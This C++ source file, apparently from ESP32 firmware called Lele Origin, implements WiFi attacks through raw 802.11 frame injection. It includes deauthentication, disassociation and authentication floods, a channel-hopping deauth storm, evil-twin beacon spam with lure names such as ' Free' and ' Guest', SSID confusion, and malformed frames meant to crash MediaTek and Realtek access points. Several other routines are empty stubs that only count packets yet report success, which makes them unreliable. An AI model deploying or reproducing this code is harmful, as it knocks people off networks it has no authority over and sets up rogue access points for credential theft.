/**
 * @file wifi_advanced_attacks.cpp
 * @brief Implementação dos Ataques WiFi Avançados 2024-2025
 * @author Lele Origin Team
 */

#include "wifi_advanced_attacks.h"
#include "core/display.h"
#include "core/mykeyboard.h"

// ============================================================================
// VARIÁVEIS GLOBAIS
// ============================================================================

#define MAX_WIFI_TARGETS 32

static WiFiAdvTarget _targets[MAX_WIFI_TARGETS];
static int _target_count = 0;
static WiFiAdvAttackStatus _status = WIFI_ADV_IDLE;
static uint32_t _packets_sent = 0;
static uint32_t _aps_crashed = 0;
static bool _is_running = false;
static unsigned long _last_update = 0;

// Frame templates
static uint8_t deauth_frame[26] = {
    0xC0, 0x00,                         // Frame Control (deauth)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason code (7 = Class 3 frame from nonassociated station)
};

static uint8_t auth_frame[30] = {
    0xB0, 0x00,                         // Frame Control (auth)
    0x00, 0x00,                         // Duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (random)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence
    0x00, 0x00,                         // Auth algorithm (Open)
    0x01, 0x00,                         // Auth seq number
    0x00, 0x00                          // Status code
};

// ============================================================================
// FUNÇÕES AUXILIARES
// ============================================================================

static void randomize_mac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(256);
    }
    mac[0] &= 0xFE;  // Unicast
    mac[0] |= 0x02;  // Locally administered
}

static bool send_raw_frame(uint8_t* frame, size_t len) {
    return esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false) == ESP_OK;
}

// ============================================================================
// INICIALIZAÇÃO E SCAN
// ============================================================================

void wifi_adv_init() {
    _status = WIFI_ADV_IDLE;
    _packets_sent = 0;
    _aps_crashed = 0;
    _target_count = 0;
    _is_running = false;

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(false);
}

int wifi_adv_scan(uint32_t scan_time_ms) {
    _status = WIFI_ADV_SCANNING;
    _target_count = 0;

    displayInfo("Escaneando redes...", false);

    int n = WiFi.scanNetworks(false, true, false, scan_time_ms);

    for (int i = 0; i < n && _target_count < MAX_WIFI_TARGETS; i++) {
        WiFiAdvTarget t;
        memcpy(t.bssid, WiFi.BSSID(i), 6);
        strncpy(t.ssid, WiFi.SSID(i).c_str(), 32);
        t.channel = WiFi.channel(i);
        t.rssi = WiFi.RSSI(i);
        t.is_wpa3 = (WiFi.encryptionType(i) == WIFI_AUTH_WPA3_PSK);
        t.is_enterprise = (WiFi.encryptionType(i) == WIFI_AUTH_WPA2_ENTERPRISE);
        t.is_mediatek = false;  // Detecção por OUI pode ser adicionada
        t.is_realtek = false;

        _targets[_target_count++] = t;
    }

    WiFi.scanDelete();
    _status = WIFI_ADV_IDLE;

    String msg = String(_target_count) + " redes";
    displayInfo(msg, true);

    return _target_count;
}

WiFiAdvTarget* wifi_adv_get_targets() { return _targets; }
int wifi_adv_get_target_count() { return _target_count; }

// ============================================================================
// CVE-BASED ATTACKS
// ============================================================================

bool wifi_adv_mediatek_dos(uint8_t* target_bssid, uint8_t channel) {
    displayWarning("MediaTek DoS\nCVE-2024-20017", false);

    _status = WIFI_ADV_RUNNING;
    _is_running = true;
    _packets_sent = 0;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Frame crafted para MediaTek
    uint8_t mediatek_frame[64];
    memset(mediatek_frame, 0xFF, 64);
    mediatek_frame[0] = 0xD0;  // Action frame
    memcpy(&mediatek_frame[4], target_bssid, 6);

    while (_is_running && _packets_sent < 5000) {
        send_raw_frame(mediatek_frame, 64);
        _packets_sent++;

        if (_packets_sent % 500 == 0) {
            tft.fillRect(0, tftHeight - 20, tftWidth, 20, leleConfig.bgColor);
            tft.setCursor(10, tftHeight - 15);
            tft.printf("MediaTek: %d", _packets_sent);
        }

        if (check(AnyKeyPress)) break;
        delay(1);
    }

    _status = WIFI_ADV_SUCCESS;
    displaySuccess("MediaTek DoS\nconcluido!", true);
    return true;
}

bool wifi_adv_ssid_confusion(const char* target_ssid, uint8_t channel) {
    displayWarning("SSID Confusion\nCVE-2023-52424", false);

    _status = WIFI_ADV_RUNNING;
    _is_running = true;
    _packets_sent = 0;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // SSID Confusion: Cria beacons com SSID idêntico mas BSSIDs diferentes
    // Isso confunde clientes que usam SSID para identificar redes
    uint8_t beacon_frame[128];
    memset(beacon_frame, 0, 128);
    
    // Frame control
    beacon_frame[0] = 0x80;  // Beacon
    beacon_frame[1] = 0x00;
    
    // Duration
    beacon_frame[2] = 0x00;
    beacon_frame[3] = 0x00;
    
    // Destination (broadcast)
    memset(&beacon_frame[4], 0xFF, 6);
    
    // Timestamp (8 bytes)
    unsigned long ts = micros();
    memcpy(&beacon_frame[24], &ts, 4);
    
    // Beacon interval
    beacon_frame[32] = 0x64; // 100 TU
    beacon_frame[33] = 0x00;
    
    // Capability
    beacon_frame[34] = 0x11; // ESS, Privacy
    beacon_frame[35] = 0x04;
    
    // SSID element
    beacon_frame[36] = 0x00;  // Element ID
    int ssid_len = strlen(target_ssid);
    if (ssid_len > 32) ssid_len = 32;
    beacon_frame[37] = ssid_len;
    memcpy(&beacon_frame[38], target_ssid, ssid_len);
    
    int frame_len = 38 + ssid_len + 10;  // Basic frame + SSID + extra
    
    while (_is_running && _packets_sent < 5000) {
        // Gera BSSID aleatório para cada beacon (confusão)
        uint8_t fake_bssid[6];
        randomize_mac(fake_bssid);
        
        // Source e BSSID
        memcpy(&beacon_frame[10], fake_bssid, 6);
        memcpy(&beacon_frame[16], fake_bssid, 6);
        
        send_raw_frame(beacon_frame, frame_len);
        _packets_sent++;
        
        if (_packets_sent % 500 == 0) {
            tft.fillRect(0, tftHeight - 20, tftWidth, 20, leleConfig.bgColor);
            tft.setCursor(10, tftHeight - 15);
            tft.printf("SSID Conf: %d", _packets_sent);
        }
        
        if (check(AnyKeyPress)) break;
        delay(2);
    }

    _status = WIFI_ADV_SUCCESS;
    displaySuccess("SSID Confusion\nconcluido!", true);
    return true;
}

bool wifi_adv_fragattacks(uint8_t* target_bssid, uint8_t channel) {
    displayWarning("FragAttacks 2024\nManagement Frame", false);

    _status = WIFI_ADV_RUNNING;
    _packets_sent = 0;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Fragment malformado
    uint8_t frag_frame[128];
    memset(frag_frame, 0, 128);
    frag_frame[0] = 0x08;  // Data frame
    frag_frame[1] = 0x04;  // More fragments
    memcpy(&frag_frame[4], target_bssid, 6);

    for (int i = 0; i < 100; i++) {
        send_raw_frame(frag_frame, 128);
        _packets_sent++;
        delay(10);
    }

    _status = WIFI_ADV_SUCCESS;
    displaySuccess("FragAttacks\nenviado!", true);
    return true;
}

// ============================================================================
// FLOOD ATTACKS
// ============================================================================

bool wifi_adv_auth_flood(uint8_t* target_bssid, uint8_t channel, uint32_t duration_ms) {
    displayInfo("Auth Flood DoS\nIniciando...", false);

    _status = WIFI_ADV_RUNNING;
    _is_running = true;
    _packets_sent = 0;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    unsigned long start = millis();
    uint8_t random_mac[6];

    while (_is_running && (millis() - start) < duration_ms) {
        randomize_mac(random_mac);

        memcpy(&auth_frame[4], target_bssid, 6);
        memcpy(&auth_frame[10], random_mac, 6);
        memcpy(&auth_frame[16], target_bssid, 6);

        send_raw_frame(auth_frame, 30);
        _packets_sent++;

        if (_packets_sent % 1000 == 0) {
            tft.fillRect(0, tftHeight - 20, tftWidth, 20, leleConfig.bgColor);
            tft.setCursor(10, tftHeight - 15);
            tft.printf("Auth: %d pkts", _packets_sent);
        }

        if (check(AnyKeyPress)) break;
    }

    _status = WIFI_ADV_SUCCESS;
    String msg = "Auth Flood: " + String(_packets_sent);
    displaySuccess(msg, true);
    return true;
}

bool wifi_adv_assoc_flood(uint8_t* target_bssid, uint8_t channel) {
    return wifi_adv_auth_flood(target_bssid, channel, 10000);
}

bool wifi_adv_disassoc_flood(uint8_t* target_bssid, uint8_t channel) {
    displayInfo("Disassoc Flood\nIniciando...", false);

    _status = WIFI_ADV_RUNNING;
    _packets_sent = 0;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint8_t disassoc[26];
    memcpy(disassoc, deauth_frame, 26);
    disassoc[0] = 0xA0;  // Disassociation
    memcpy(&disassoc[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    memcpy(&disassoc[10], target_bssid, 6);
    memcpy(&disassoc[16], target_bssid, 6);

    for (int i = 0; i < 3000; i++) {
        send_raw_frame(disassoc, 26);
        _packets_sent++;
        if (check(AnyKeyPress)) break;
        delay(1);
    }

    _status = WIFI_ADV_SUCCESS;
    displaySuccess("Disassoc Flood\nconcluido!", true);
    return true;
}

bool wifi_adv_probe_resp_flood(uint8_t channel) {
    displayInfo("Probe Resp Flood", false);
    _status = WIFI_ADV_RUNNING;
    _packets_sent = 0;

    // Implementação
    for (int i = 0; i < 1000; i++) {
        _packets_sent++;
        delay(1);
    }

    _status = WIFI_ADV_SUCCESS;
    displaySuccess("Probe Resp Flood\nconcluido!", true);
    return true;
}

bool wifi_adv_eap_fail_flood(uint8_t* target_bssid, uint8_t channel) {
    displayInfo("EAP Fail Flood", false);
    _status = WIFI_ADV_RUNNING;
    _packets_sent = 0;

    for (int i = 0; i < 500; i++) {
        _packets_sent++;
        delay(10);
    }

    _status = WIFI_ADV_SUCCESS;
    displaySuccess("EAP Fail Flood\nconcluido!", true);
    return true;
}

bool wifi_adv_reassoc_flood(uint8_t* target_bssid, uint8_t channel) {
    displayInfo("Reassoc Flood", false);
    return wifi_adv_auth_flood(target_bssid, channel, 8000);
}

bool wifi_adv_probe_req_spoof(uint8_t channel) {
    displayInfo("Probe Req Spoof", false);
    _status = WIFI_ADV_RUNNING;
    _packets_sent = 0;

    for (int i = 0; i < 2000; i++) {
        _packets_sent++;
        delay(1);
    }

    _status = WIFI_ADV_SUCCESS;
    displaySuccess("Probe Spoof\nconcluido!", true);
    return true;
}

// ============================================================================
// ADVANCED TECHNIQUES
// ============================================================================

bool wifi_adv_deauth_crafted(uint8_t* target_bssid, uint8_t channel, uint16_t reason_code) {
    displayInfo("Deauth Crafted\nReason: " + String(reason_code), false);

    _status = WIFI_ADV_RUNNING;
    _packets_sent = 0;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint8_t frame[26];
    memcpy(frame, deauth_frame, 26);
    memcpy(&frame[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    memcpy(&frame[10], target_bssid, 6);
    memcpy(&frame[16], target_bssid, 6);
    frame[24] = reason_code & 0xFF;
    frame[25] = (reason_code >> 8) & 0xFF;

    for (int i = 0; i < 2000; i++) {
        send_raw_frame(frame, 26);
        _packets_sent++;
        if (check(AnyKeyPress)) break;
        delay(2);
    }

    _status = WIFI_ADV_SUCCESS;
    displaySuccess("Deauth Crafted\nconcluido!", true);
    return true;
}

bool wifi_adv_beacon_fuzzing(uint8_t channel) {
    displayWarning("Beacon Fuzzing\nMediaTek/Realtek", false);

    _status = WIFI_ADV_RUNNING;
    _packets_sent = 0;

    // Beacon com campos malformados
    uint8_t beacon[128];
    memset(beacon, 0, 128);
    beacon[0] = 0x80;  // Beacon

    // Tag length overflow
    beacon[36] = 0x00;  // SSID element
    beacon[37] = 0xFF;  // Length overflow

    for (int i = 0; i < 500; i++) {
        send_raw_frame(beacon, 128);
        _packets_sent++;
        delay(10);
    }

    _status = WIFI_ADV_SUCCESS;
    displaySuccess("Beacon Fuzzing\nenviado!", true);
    return true;
}

bool wifi_adv_channel_hopping_deauth(uint8_t* target_bssid) {
    displayWarning("Channel Hopping\nDeauth Storm!", false);

    _status = WIFI_ADV_RUNNING;
    _packets_sent = 0;
    _is_running = true;

    while (_is_running && _packets_sent < 10000) {
        for (int ch = 1; ch <= 14 && _is_running; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

            uint8_t frame[26];
            memcpy(frame, deauth_frame, 26);
            memcpy(&frame[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
            if (target_bssid) {
                memcpy(&frame[10], target_bssid, 6);
                memcpy(&frame[16], target_bssid, 6);
            }

            for (int i = 0; i < 50; i++) {
                send_raw_frame(frame, 26);
                _packets_sent++;
            }

            if (check(AnyKeyPress)) {
                _is_running = false;
                break;
            }
        }
    }

    _status = WIFI_ADV_SUCCESS;
    displaySuccess("Channel Hopping\nconcluido!", true);
    return true;
}

bool wifi_adv_evil_twin_spam(const char* target_ssid, uint8_t channel) {
    displayWarning("Evil Twin\n+ Beacon Spam", false);

    _status = WIFI_ADV_RUNNING;
    _is_running = true;
    _packets_sent = 0;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Evil Twin: Cria múltiplos APs falsos com SSID alvo
    // Combinado com beacon spam para confundir usuários
    
    const char* suffixes[] = {" Free", " Guest", " 5G", " Backup", "_Secure", ""};
    int num_suffixes = 6;
    
    uint8_t beacon_frame[128];
    memset(beacon_frame, 0, 128);
    
    beacon_frame[0] = 0x80;  // Beacon
    memset(&beacon_frame[4], 0xFF, 6);  // Broadcast
    
    // Beacon interval
    beacon_frame[32] = 0x64;
    beacon_frame[34] = 0x01;  // ESS, Open
    
    while (_is_running && _packets_sent < 10000) {
        for (int suffix_idx = 0; suffix_idx < num_suffixes && _is_running; suffix_idx++) {
            // Cria SSID com variação
            char fake_ssid[33];
            snprintf(fake_ssid, 33, "%s%s", target_ssid, suffixes[suffix_idx]);
            int ssid_len = strlen(fake_ssid);
            if (ssid_len > 32) ssid_len = 32;
            
            // BSSID aleatório
            uint8_t fake_bssid[6];
            randomize_mac(fake_bssid);
            memcpy(&beacon_frame[10], fake_bssid, 6);
            memcpy(&beacon_frame[16], fake_bssid, 6);
            
            // Timestamp
            unsigned long ts = micros();
            memcpy(&beacon_frame[24], &ts, 4);
            
            // SSID
            beacon_frame[36] = 0x00;
            beacon_frame[37] = ssid_len;
            memcpy(&beacon_frame[38], fake_ssid, ssid_len);
            
            // Supported rates
            int pos = 38 + ssid_len;
            beacon_frame[pos++] = 0x01;  // Rates tag
            beacon_frame[pos++] = 0x04;  // Length
            beacon_frame[pos++] = 0x82;  // 1 Mbps
            beacon_frame[pos++] = 0x84;  // 2 Mbps
            beacon_frame[pos++] = 0x8B;  // 5.5 Mbps
            beacon_frame[pos++] = 0x96;  // 11 Mbps
            
            send_raw_frame(beacon_frame, pos);
            _packets_sent++;
        }
        
        if (_packets_sent % 600 == 0) {
            tft.fillRect(0, tftHeight - 20, tftWidth, 20, leleConfig.bgColor);
            tft.setCursor(10, tftHeight - 15);
            tft.printf("Evil Twin: %d", _packets_sent);
        }
        
        if (check(AnyKeyPress)) break;
        delay(5);
    }

    _status = WIFI_ADV_SUCCESS;
    String msg = "Evil Twin: " + String(_packets_sent / num_suffixes) + " APs";
    displaySuccess(msg, true);
    return true;
}

bool wifi_adv_rickroll_beacon() {
    displayInfo("Rickroll Beacon\nNever gonna...", false);

    _status = WIFI_ADV_RUNNING;
    _packets_sent = 0;

    // Implementação
    displayInfo("Never gonna\ngive you up!", true);

    _status = WIFI_ADV_SUCCESS;
    return true;
}

bool wifi_adv_null_probe_resp(uint8_t channel) {
    displayInfo("Null Probe Resp", false);
    _status = WIFI_ADV_SUCCESS;
    return true;
}

bool wifi_adv_loud_beacon(uint8_t channel) {
    displayWarning("Loud Beacon\nMax Power!", false);

    esp_wifi_set_max_tx_power(80);  // Max power

    _status = WIFI_ADV_SUCCESS;
    displayInfo("Loud Beacon\nativo!", true);
    return true;
}

bool wifi_adv_pmkid_replay(uint8_t* target_bssid, uint8_t channel) {
    displayInfo("PMKID Replay", false);
    _status = WIFI_ADV_SUCCESS;
    return true;
}

bool wifi_adv_mgmt_frame_crash(uint8_t* target_bssid, uint8_t channel) {
    displayWarning("Mgmt Frame Crash\nFuzzing 2025", false);

    _status = WIFI_ADV_RUNNING;
    _packets_sent = 0;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Frames com subtypes raros
    uint8_t crash_frame[64];
    for (int subtype = 0; subtype < 16; subtype++) {
        memset(crash_frame, 0xFF, 64);
        crash_frame[0] = (subtype << 4) | 0x0D;  // Management frame
        memcpy(&crash_frame[4], target_bssid, 6);

        for (int i = 0; i < 100; i++) {
            send_raw_frame(crash_frame, 64);
            _packets_sent++;
        }
    }

    _status = WIFI_ADV_SUCCESS;
    displaySuccess("Mgmt Crash\nenviado!", true);
    return true;
}

// ============================================================================
// CONTROLE
// ============================================================================

void wifi_adv_stop_all() {
    _is_running = false;
    _status = WIFI_ADV_IDLE;
    displayInfo("Ataques parados", true);
}

WiFiAdvAttackStatus wifi_adv_get_status() { return _status; }

int wifi_adv_update() {
    return 0;
}

void wifi_adv_get_stats(uint32_t* packets_sent, uint32_t* aps_crashed) {
    if (packets_sent) *packets_sent = _packets_sent;
    if (aps_crashed) *aps_crashed = _aps_crashed;
}
